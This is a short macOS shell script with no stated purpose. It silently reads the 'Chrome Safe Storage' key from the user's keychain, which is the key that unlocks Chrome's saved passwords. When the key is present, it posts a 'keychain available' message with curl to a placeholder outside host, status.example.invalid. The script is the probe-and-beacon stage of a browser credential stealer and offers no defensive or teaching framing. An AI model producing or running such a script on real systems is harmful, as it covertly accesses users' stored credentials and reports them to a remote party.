#!/bin/sh
SECRET=$(security find-generic-password -w -s 'Chrome Safe Storage' 2>/dev/null)
if [ -n "$SECRET" ]; then
  printf '%s' 'keychain available' | curl --data-binary @- https://status.example.invalid/check
fi
